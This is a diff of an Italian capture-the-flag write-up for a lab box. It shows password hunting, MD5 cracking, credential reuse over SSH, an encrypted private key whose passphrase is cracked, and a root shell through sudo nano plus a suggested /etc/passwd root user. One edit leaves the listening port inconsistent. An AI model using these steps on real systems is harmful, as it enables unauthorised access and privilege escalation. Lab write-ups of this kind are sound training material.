@@ -9,15 +9,17 @@
 ## Post-Exploitation - User 1 Escalation - ##
 
 * Scopro un file di config con delle credenziali di un DB, grazie al comando:
-
+```
 $ grep -rnw . -e 'db_passwd'  
 ./plugins/ona_nmap_scans/install.php:153:        mysql -u {$self['db_login']} -p{$self['db_passwd']} {$self['db_database']} < {$sqlfile}</font><br><br>
 ./include/functions_db.inc.php:102:        $ona_contexts[$context_name]['databases']['0']['db_passwd']   = $db_context[$type] [$context_name] ['primary'] ['db_passwd'];
 ./include/functions_db.inc.php:108:        $ona_contexts[$context_name]['databases']['1']['db_passwd']   = $db_context[$type] [$context_name] ['secondary'] ['db_passwd'];
 ./include/functions_db.inc.php:150:            $ok1 = $object->PConnect($self['db_host'], $self['db_login'], $db['db_passwd'], $self['db_database']);
---->>>> ./local/config/database_settings.inc.php:13:        'db_passwd' => 'n1nj4W4rri0R!',
+./local/config/database_settings.inc.php:13:        'db_passwd' => 'n1nj4W4rri0R!',
+```
 
-* Contenuto del file:
+* Contenuto del file "database_settings.inc.php":
+```
 <?php
 
 $ona_contexts=array (
@@ -39,27 +41,32 @@ $ona_contexts=array (
     'context_color' => '#D3DBFF',
   ),
 );
-
+```
 
 * mysql -u ona_sys -p ona_default -e 'show tables'
 
 * mysql -u ona_sys -p ona_default -e 'select * from users'
-
+```
 id      username        password        level   ctime   atime
 1       guest   098f6bcd4621d373cade4e832627b4f6        0       2020-02-15 13:47:44     2020-02-15 13:47:43
 2       admin   21232f297a57a5a743894a0e4a801fc3        0       2007-10-30 03:00:17     2007-12-02 22:10:26
-
+```
 * Uso CrackStation per rompere gli MD5, risultato:
+```
 1 test
 2 admin
+```
 
 * Ho vinto il premio dell'anno per PirlaSummaCumLaude, ho fatto ssh jimmy@10.10.10.171 e la password era... n1nj4W4rri0R!
+
 RabbitHole il DB!
 
 ## Post-Exploitation - User 2 Escalation - ##
 
 * Ho trovato nella folder /home/jimmy/.ssh la seguente stringa:
+```
 |1|+jHNuEBNL1R1f9YVJsKhsHWRw24=|p4AqqwkcMx9DwyxPRhzcCxxJR1U= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqbD5jGewKxd8heN452cfS5LS/VdUroTScThdV8IiZdTxgSaXN1Qga4audhlYIGSyDdTEL8x2tPAFPpvipRrLE=
+```
 
   ** Nope tutte robe inutili
   
@@ -68,19 +75,19 @@ RabbitHole il DB!
 * Rilevata folder "/var/www/internal/" con "main.php" interessante.
 
 * C'è una funzioncina che ti stampa a video la chiave RSA di Joanna. La invoco con:
-
-    curl 127.0.0.1/main.php
-    
+```
+curl 127.0.0.1/main.php
+```
 * Non succede nulla, quindi cerco altre eventuali porte in ascolto:
-
-    netstat -tulpn
-    
-* Trovo altre porte aperte in ascolto, tra cui: 52846
+```
+netstat -tulpn
+```  
+* Trovo altre porte aperte in ascolto, tra cui: *2846*
 
 * curl http://127.0.0.1:52846/main.php
 
 * Recupero l'id_rsa di Joanna:
-
+```
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
 DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
@@ -111,15 +118,16 @@ qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
 z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
 K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
 -----END RSA PRIVATE KEY-----
+```
 
 * La chiave è protetta da passphrase, la rompo con John e scopro che è:
-
-    "bloodninjas"
-
+```
+"bloodninjas"
+```
 * Apro una nuova sessione con Joanna:
-    
-    ssh -i id_rsa_joanna joanna@10.10.10.171
-
+```    
+$ ssh -i id_rsa_joanna joanna@10.10.10.171
+```
 *#*#* Prelevo User Flag! *#*#*
 
 ## Post-Exploitation - Root Privilege Escalation - ##
@@ -127,17 +135,18 @@ K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
 * Si comincia per il root! Con "sudo -l" scopro che Joanna è abilitata a lanciare sudo senza password "sudo /bin/nano /opt/priv", lo lancio e mi apre una sessione di nano.
 
 * GTFOBins mi suggerisce come spawnare una shell con privilegi di root: 
-    
-    CTRL+R CTRL+X e poi "reset; sh 1>&0 2>&0"
-
+ ```   
+CTRL+R CTRL+X e poi "reset; sh 1>&0 2>&0"
+```
 * cat /root/root.txt 
 
 *#*#* Prelevo ROOT's Flag! *#*#*
 
 BIS) In alernativa posso aggiungere un utente al file /etc/psswd! Apro il nano in sudo come al punto 11, quindi:
-
+```
   CTRL+O
 
   etc/psswd
 
   Aggiungo un utente root.
+```
